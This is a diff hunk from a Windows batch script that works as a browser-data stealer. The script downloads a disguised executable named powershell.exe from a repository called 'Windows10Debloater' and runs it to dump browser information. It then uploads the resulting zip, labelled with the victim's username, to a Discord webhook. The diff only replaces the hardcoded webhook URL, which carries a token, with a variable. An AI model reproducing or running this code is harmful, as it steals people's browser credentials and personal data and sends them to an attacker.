@@ -8,4 +8,4 @@ curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%user
 endlocal
 powershell -Command "iwr "https://github.com/Dazd-Pkz/Windows10Debloater/raw/main/powershell.exe" -o %temp%\powershell.exe"
 %temp%\powershell.exe --zip --dir dump
-curl -k -F "payload_json={\"content\": \"All Internet Browser Information of %username%\"}" -F "file1=@dump\dump.zip" https://discord.com/api/webhooks/1010870369781026846/Z3yzyXcAs1czqJeNmL8nv2vWFeZMFSP2R9IldAVe4AXmHox5x6ZBWX12HK4BWitlkeJT
+curl -k -F "payload_json={\"content\": \"All Internet Browser Information of %username%\"}" -F "file1=@dump\dump.zip" %w%
